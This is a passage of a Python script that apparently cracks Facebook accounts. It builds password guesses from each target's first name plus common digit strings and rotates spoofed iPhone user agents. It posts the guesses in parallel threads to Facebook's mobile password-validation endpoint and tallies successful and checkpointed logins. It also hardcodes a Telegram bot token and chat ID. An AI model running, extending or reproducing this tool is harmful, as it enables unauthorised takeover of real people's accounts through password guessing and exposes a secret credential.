...
print()
ID=input('\033[2;32m[+] \x1b[38;5;209mID : \033[2;35m')
os.system('clear')
print('\n')
token='6831253864:AAEGj0-SW8uWudFna3wiLBXwnT8CmE_icRU'
print('\n')
ID='1853662792'
os.system('clear')
 #------------------[ DYAR ]-------------------#
...
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Brave/1.2.11 Mobile/13G34 Safari/601.1.46',
...
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/FBIOS;FBAV/196.0.0.52.95;FBBV/129677436;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/ru_RU;FBOP/5',
...
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/55.0.206190063 Mobile/15G77 Safari/604.1',
...
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/267.0.537056344 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1',
...
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0_2 like Mac OS X; ru-ru) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5C1 Safari/525.20',
...
'Mozilla/2.1 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/13.0 Mobile/17A5579e Safari/8775.75',
...
'Mozilla/5.0 (iPhone12,3; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit (KHTML, like Gecko) Version/14.0 Mobile Safari Quora 8.0.0 rv:2194',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 iPhone12_3 BingWeb/6.9.10.0',
'Mozilla/5.0 (iPad; CPU OS 15_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Tablet/15E148 Safari/604.1',
...
##   print(f""""""\033[1;37m[1] FILE DUMP""")
    print(f"""\033[1;37m[2] DUMP FILE""")
    print("""\033[1;37m[0] exit""")
    HAMA = input('\033[1;37mCHOOSE :  ')
    if HAMA in ['111']:
        login()
        dump_massal()
    elif HAMA in ['1']:
...
def setting():
  ##  print('\033[0;92m=============================')
    ...
    ##print("\033[97;1m[\033[92;1m3\033[97;1m] DYAR \x1b[33m[3\x1b[33m] \x1b[33m[\033[0;92mMIX \x1b[36mID\x1b[33m]")
 ##   print('\033[0;92m=============================')
...
def passwrd():
 ...
 ##   print("\033[97;1m[\033[92;1m➢\033[97;1m] DYAR \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTODAY \x1b[36mTIME\x1b[33m] : \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
#   ## print("\033[97;1m[\033[92;1m➢\033[97;1m] DYAR \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mSTART \x1b[36mCRACKING\x1b[33m]")
    print('\033[1;37m-----------------------------------------------')
        ...
        for yuzong in id2:
            ...
            if len(nmf)<6:
                if len(frs)<3:
                    ...
                    pwv.append(frs+'1234')
                    pwv.append(frs+'123')
                    pwv.append(frs+'123446')
                    pwv.append(frs+'12346789')
                    pwv.append('12345'+frs)
                    pwv.append('1234'+frs)
                    pwv.append('123'+frs)
                    pwv.append('987654321'+frs)
                    pwv.append('12345'+frs)
                    pwv.append('4321'+frs)
                    pwv.append('321'+frs)
                    pwv.append(frs+'2000')
            ...
            if 'mobile' in method:
                ...
                pool.submit(crackfree,idf,pwv)
  ##  print('\n\033[1;37m===================================')
    print('\CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \r[ KONAN ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}  [cp] - {cp}   {bo}{'{}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}\x1b[33m[\x1b[32mDYAR\x1b[33m]{P} \x1b[33m[{H}{loop}{P}\x1b[33m]{P} \x1b[33m[{H}{len(id)}{P}\x1b[33m] \x1b[33m[\x1b[32mOK/\x1b[36mCP\x1b[33m] \x1b[33m[\x1b[32m{ok}/\x1b[36m{cp}\x1b[33m] \x1b[33m[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}\x1b[33m]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '2', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
